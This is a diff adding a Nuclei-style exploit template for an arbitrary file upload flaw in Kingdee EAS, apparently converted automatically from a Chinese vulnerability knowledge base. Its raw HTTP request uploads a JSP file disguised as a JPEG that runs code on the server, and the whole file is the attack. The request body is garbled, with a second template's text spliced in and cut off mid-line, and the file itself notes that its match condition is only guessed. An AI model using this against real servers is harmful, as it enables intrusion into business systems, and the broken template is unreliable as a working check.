@@ -1,0 +1,20 @@
+id: poc-wunl953t6oayfu4w
+info:
+  name: 金蝶EAS uploadlogo存在任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wunl953t6oayfu4w
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wunl953t6oayfu4w
+http:
+- raw:
+  - "POST /plt_portal/setting/uploadLogo.action HTTP/1.1\n\nHost: {{Hostname}}\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p\n\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\n\nContent-Disposition: form-data; name=\"chooseLanguage_top\"\n\nch\n\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\n\nContent-Disposition: form-data; name=\"dataCenter\"\n\nxx\n\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\n\nContent-Disposition: form-data; name=\"insId\"  fragment-1641287796427\n\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\n\nContent-Disposition: form-data; name=\"type\"\n\ntop\n\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\n\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.jsp\"\n\nContent-Type: image/jpeg\n\n<%{\n\nout.println(System.getProperty(\"user.name\"));\n\nout.println(255*255);\n\n}%>\n\n------WebKitFormBoundarycxkT8bV6WLIUzm2p--\n\n4、nuclei\n\nid: kingdeeeas-uploadlogo-upload\n\ninfo:\n\n  name: kingdeeeas-uploadlogo-upload\n\n  author: xxx\n\n  severity: critical\n\nvariables:\n\n  filename: \"{{to_lower(rand_base(8))}}\"\n\nhttp:\n\n  - raw:\n\n    - |\n\n      POST /plt_portal/setting/uploadLogo.action HTTP/1.1\n\n      Host: {{Hostname}}\n\n      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36\n\n      Connection: close\n\n      Content-Length: 700\n\n      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\n      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p\n\n      Accept-Encoding: gzip, deflate\n\n      ------WebKitFormBoundarycxkT8bV6WLIUzm2p\n\n      Content-Disposition: form-data; name=\"chooseLanguage_top\"\n\n      ch\n\n      ------WebKitForm"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
